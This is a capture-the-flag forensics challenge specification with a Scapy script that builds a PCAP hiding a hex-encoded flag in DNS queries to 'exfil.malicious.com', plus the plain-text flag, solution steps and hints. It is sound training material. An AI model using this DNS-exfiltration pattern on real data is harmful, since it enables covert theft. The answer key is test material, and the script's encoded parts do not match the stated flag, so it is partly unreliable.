# Suspicious Traffic Challenge

## Challenge Overview
This medium-difficulty forensics challenge involves network packet capture analysis. Participants will need to analyze DNS traffic to discover data being exfiltrated through DNS queries.

## Challenge Creation Instructions
1. Create a PCAP file containing normal network traffic mixed with suspicious DNS queries
2. The DNS queries should contain encoded/encrypted parts of the flag
3. The queries should be made to multiple subdomains of a suspicious domain
4. When properly decoded, the DNS queries will reveal the flag: `flag{DNS_3xf1ltr4t10n_1s_cl3v3r}`

## Setup Instructions
1. Use Scapy, tcpreplay, or another tool to generate the PCAP file:
   ```python
   from scapy.all import *

   # Create a list to hold packets
   packets = []
   
   # Add some normal traffic (HTTP, HTTPS, etc.)
   for i in range(20):
       packets.append(IP(dst="142.250.180.4")/TCP(dport=443)/Raw(b"Normal HTTPS traffic"))
       packets.append(IP(dst="172.217.167.36")/TCP(dport=80)/Raw(b"Normal HTTP traffic"))
   
   # Add the flag data as DNS queries (data exfiltration)
   flag_parts = [
       b"66.6c.61.67.",  # "flag" in hex
       b"44.4e.53.5f",   # "DNS_" in hex
       b"33.78.66.31",   # "3xf1" in hex
       b"6c.74.72.34",   # "ltr4" in hex
       b"74.31.30.6e",   # "t10n" in hex
       b"5f.31.73.5f",   # "_1s_" in hex
       b"63.6c.33.76",   # "cl3v" in hex
       b"33.72"          # "3r" in hex
   ]
   
   # Create DNS queries for each part of the flag
   for i, part in enumerate(flag_parts):
       # Create subdomain with base64/hex-encoded flag part
       query = part.decode() + ".exfil.malicious.com"
       
       # Add the DNS query packet
       packets.append(IP(dst="10.0.0.53")/UDP(dport=53)/DNS(
           rd=1,
           qd=DNSQR(qname=query)
       ))
   
   # Add some more normal traffic to obscure the exfiltration
   for i in range(20):
       packets.append(IP(dst="13.107.42.14")/TCP(dport=443)/Raw(b"More normal traffic"))
   
   # Write the packets to a PCAP file
   wrpcap("capture.pcap", packets)
   ```

2. Place the resulting capture.pcap file in the artifacts folder

## Expected Solution

Participants will:
1. Open the PCAP file in Wireshark
2. Filter for DNS traffic: `dns` in the display filter
3. Notice suspicious DNS queries to subdomains of malicious.com
4. Extract the encoded parts from the subdomain names
5. Decode the hex data to reveal the flag

## Hints (if needed)
- "Pay attention to the DNS traffic in the capture."
- "Those subdomains look strange... are they encoding something?"
- "Sometimes data can be hidden in plain sight - like in domain names." 